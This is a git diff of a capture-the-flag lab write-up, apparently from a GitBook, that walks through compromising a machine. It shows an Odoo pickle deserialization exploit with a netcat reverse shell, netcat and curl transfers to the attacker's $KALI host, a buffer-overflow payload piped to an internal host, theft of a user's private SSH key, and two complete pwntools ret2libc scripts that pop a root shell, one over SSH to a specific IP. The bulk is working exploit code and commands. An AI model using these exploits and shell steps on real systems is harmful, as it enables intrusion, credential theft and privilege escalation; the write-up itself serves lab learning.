@@ -100,23 +100,23 @@ Password: SecurePassword123!
 
 exploit: [https://www.exploit-db.com/exploits/44064](https://www.exploit-db.com/exploits/44064)
 
-In order to exploit the vulnerability, you should navigate to the Apps page (the link is in the navigation bar at the top and search for and install \u201cDatabase Anonymization\u201d in the search bar. We have to deselect the Apps filter in the search bar for it to show up.
+In order to exploit the vulnerability, you should navigate to the Apps page (the link is in the navigation bar at the top and search for and install Database Anonymization in the search bar. We have to deselect the Apps filter in the search bar for it to show up.
 
-<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 Install Database Anonymization&#x20;
 
-<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 Once we have the module installed, we navigate to the settings page and select Anonymize database  under Database anonymization and click on the Anonymize Database button.&#x20;
 
-<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
 
 
-<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -146,9 +146,9 @@ nc -lvnp 1337
 
 Next, we refresh the page and navigate to the same page under settings. We upload the exploit.pickle file generated our script and click on Reverse the Database Anonymization button. We should have a reverse shell.
 
-<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Victim**
 
@@ -160,7 +160,7 @@ stty raw -echo;fg
 
 
 
-<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -178,9 +178,7 @@ nc -l -p 1234 > ret
 nc -w 3 $KALI 1234 < ret
 ```
 
-
-
-## Buffer Overflow <a href="#find-pages" id="find-pages"></a>
+## Lateral Movement #1 <a href="#find-pages" id="find-pages"></a>
 
 **Kali**
 
@@ -188,11 +186,11 @@ nc -w 3 $KALI 1234 < ret
 ghidra
 ```
 
-<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
-<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -211,7 +209,7 @@ gdb ret
 **Kali(gdb)**
 
 ```
-gdb r
+r
 ```
 
 <figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
@@ -234,7 +232,7 @@ We see the win function is located at 0x400646
 objdump -t ret
 ```
 
-<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>
 
 Confirmed it crashes after 136.
 
@@ -244,7 +242,7 @@ Confirmed it crashes after 136.
 python -c 'print("A"* 137)' | ./ret 
 ```
 
-<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>
 
 I wanted to confirm it would crash where we expected so I added the program into a for loop
 
@@ -296,7 +294,7 @@ Testing that the payload still works on our local machine.
 (cat payload.bin; cat) | ./ret
 ```
 
-<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Kali**
 
@@ -316,7 +314,7 @@ curl http://$KALI:82/payload.bin -o payload.bin
 
 <figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
 
-#### &#x20;<a href="#find-pages" id="find-pages"></a>
+## Lateral Movement #2 <a href="#find-pages" id="find-pages"></a>
 
 **Victim(root)**
 
@@ -329,9 +327,219 @@ nmap 172.17.0.1
 
 <figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
 
+**Victim(root)**
+
+```
+(cat payload.bin; cat) | nc 172.17.0.1 4444 
+```
+
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
 
 
+**Victim(zeeshan)**
+
+```
+sudo -l
+```
+
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+
+
+**Victim**
+
+```
+cat /home/zeeshan/.ssh/id_rsa
+```
+
+<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+id\_rsa has no password so we can just login without cracking it
+
+**Kali**
+
+```
+chmod 600 id_rsa
+/opt/john/ssh2john.py id_rsa > id_john.txt
+```
+
+<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+## **Privilege Escalation**&#x20;
+
+**Kali**
+
+```
+scp -i id_rsa zeeshan@$VICTIM:/exploit_me /root/exploit_me
+ghidra
+```
+
+### &#x20;<a href="#netcat" id="netcat"></a>
+
+<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+**Kali**
+
+```
+checksec exploit_me
+```
+
+<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+
+**Kali**
+
+```
+cyclic 256
+```
+
+**Kali**
+
+```
+gdb exploit_me
+```
+
+**Kali(gdb)**
+
+```
+r
+```
+
+<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+
+**Kali(gdb)**
+
+```
+x $rsp
+```
+
+<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+
+**Kali**
+
+```
+cyclic -l 0x6161616b
+```
+
+<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+
+### &#x20;<a href="#netcat" id="netcat"></a>
+
+**final.py**
+
+```
+from pwn import *
+
+elf = ELF('/root/exploit_me')
+elf.address = 0x400000
+context.binary = elf
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+rop = ROP([elf])
+PUTS_PLT = elf.plt['puts'] 
+MAIN_PLT = elf.symbols['main']
+PUTS_GOT = elf.got['puts']
+POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
+RET = (rop.find_gadget(['ret']))[0]
+
+r = process('/root/exploit_me')
+
+payload = cyclic(40) +   p64(POP_RDI) + p64(PUTS_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
+
+r.sendlineafter('Exploit this binary for root!\n', payload)
+leak = int.from_bytes(r.read(6), 'little')
+libc.address = leak - libc.symbols['puts'] 
+print(hex(leak))
+
+BINSH = next(libc.search(b'/bin/sh')) 
+SYSTEM = libc.sym['system']
+EXIT = libc.sym['exit']
+
+rop = ROP([libc])
+rop.execve(BINSH, 0, 0)
+print(rop.dump())
+payload = cyclic(40) + rop.chain()
+
+r.sendlineafter('Exploit this binary for root!\n', payload)
+
+r.interactive()
+```
+
+**Kali**
+
+```
+python final.py
+```
+
+<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+
+**Victim**
+
+```
+ldd /exploit_me 
+```
+
+
+
+<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+
+**Kali**
+
+```
+scp -i id_rsa zeeshan@$VICTIM:/lib/x86_64-linux-gnu/libc.so.6 /root/
+libc.so.6  
+```
+
+
+
+**final.py - version 2**
+
+```
+from pwn import *
+
+elf = ELF('/root/exploit_me')
+elf.address = 0x400000
+context.binary = elf
+libc = ELF('/root/libc.so.6')
+rop = ROP([elf])
+PUTS_PLT = elf.plt['puts'] 
+MAIN_PLT = elf.symbols['main']
+PUTS_GOT = elf.got['puts']
+POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
+RET = (rop.find_gadget(['ret']))[0]
+
+s = ssh(user='zeeshan', host='10.10.159.46', keyfile='/root/id_rsa')
+r = s.process('/./exploit_me')
+
+payload = cyclic(40) +   p64(POP_RDI) + p64(PUTS_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
+
+r.sendlineafter('Exploit this binary for root!\n', payload)
+leak = int.from_bytes(r.read(6), 'little')
+libc.address = leak - libc.symbols['puts'] 
+print(hex(leak))
+
+BINSH = next(libc.search(b'/bin/sh')) 
+SYSTEM = libc.sym['system']
+EXIT = libc.sym['exit']
+
+rop = ROP([libc])
+rop.execve(BINSH, 0, 0)
+print(rop.dump())
+payload = cyclic(40) + rop.chain()
+
+r.sendlineafter('Exploit this binary for root!\n', payload)
+
+r.interactive()
+```
+
+**Kali**
+
+```
+python3 final.py
+```
+
+<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
 
 
 
